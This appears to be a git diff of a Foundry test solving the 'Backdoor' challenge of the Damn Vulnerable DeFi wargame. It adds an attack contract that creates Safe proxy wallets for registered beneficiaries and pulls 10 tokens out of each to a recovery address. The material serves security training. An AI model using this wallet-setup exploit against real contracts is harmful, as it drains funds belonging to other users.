@@ -72,7 +72,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        AttackBackdoor attacker = new AttackBackdoor(address(singletonCopy), address(walletFactory), address(walletRegistry), address(token), recovery);
+        attacker.attack(users);
     }
 
     /**
@@ -100,20 +101,20 @@ contract BackdoorChallenge is Test {
 contract AttackBackdoor {
     address private immutable singletonCopy;
     address private immutable walletFactory;
-    address private immutable WalletRegistry;
-    DamnValuableToken token;
+    address private immutable walletRegistry;
+    DamnValuableToken private immutable token;
     address recovery;
 
     constructor(
         address _singletonCopy,
         address _walletFactory,
-        address _WalletRegistry,
+        address _walletRegistry,
         address _token,
         address _recovery
     ) {
         singletonCopy = _singletonCopy;
         walletFactory = _walletFactory;
-        WalletRegistry = _WalletRegistry;
+        walletRegistry = _walletRegistry;
         token = DamnValuableToken(_token);
         recovery = _recovery;
     }
@@ -136,26 +137,18 @@ contract AttackBackdoor {
                 address(0),
                 0, // 0 is ETH
                 0,
-                address(0)
+                0
             );
 
             // create new proxy on behalf of the beneficiary
-            SafeProxy _newProxy = new SafeProxyFactory().createProxyWithCallback(
+            SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
                 singletonCopy,
                 _initializer,
                 i,
-                IProxyCreationCallback(WalletRegistry)
+                IProxyCreationCallback(walletRegistry)
             );
 
             token.transferFrom(address(_newProxy), recovery, 10 ether);
         }
     }
 }
-        // address[] calldata _owners,
-        // uint256 _threshold,
-        // address to,
-        // bytes calldata data,
-        // address fallbackHandler,
-        // address paymentToken,
-        // uint256 payment,
-        // address payable paymentReceiver
